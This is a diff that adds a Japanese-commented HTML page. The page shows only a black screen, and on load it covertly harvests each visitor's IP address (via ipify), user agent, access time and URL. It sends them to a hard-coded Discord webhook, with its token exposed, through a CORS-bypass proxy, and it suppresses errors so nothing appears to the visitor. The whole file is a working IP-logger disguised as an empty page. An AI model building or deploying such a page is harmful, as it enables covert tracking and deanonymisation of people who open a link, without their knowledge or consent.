@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>-</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background-color: #000000; /* 真っ黒な背景 */
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+        // 設定されたDiscord Webhook URL
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1560964662747594849/ejFPLXiN6kGlC_8P_raXz4i87PtzYXyV7ncXel6EjI_CE-ZJNiS2mv7_jHlUJByNXImh';
+
+        async function sendLog() {
+            try {
+                // 1. ipify APIからIPアドレスを取得
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const userIp = ipData.ip;
+
+                // 2. ブラウザ情報と現在時刻を取得
+                const userAgent = navigator.userAgent;
+                const accessTime = new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' });
+                const pageUrl = window.location.href;
+
+                // 3. Discordに送信するメッセージの作成
+                const payload = {
+                    embeds: [{
+                        title: "🚨 新しいアクセスを検知しました",
+                        color: 0x000000,
+                        fields: [
+                            { name: "IPアドレス", value: `\`${userIp}\``, inline: true },
+                            { name: "アクセス時刻", value: accessTime, inline: true },
+                            { name: "アクセス先URL", value: pageUrl },
+                            { name: "ユーザーエージェント", value: `\`\`\`${userAgent}\`\`\`` }
+                        ]
+                    }]
+                };
+
+                // 4. CORS回避プロキシを経由してDiscord Webhookに送信
+                const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(DISCORD_WEBHOOK_URL);
+
+                await fetch(proxyUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (error) {
+                // エラーが発生しても画面には何も表示しない
+            }
+        }
+
+        // ページが読み込まれたら自動実行
+        window.addEventListener('DOMContentLoaded', sendLog);
+    </script>
+</body>
+</html>
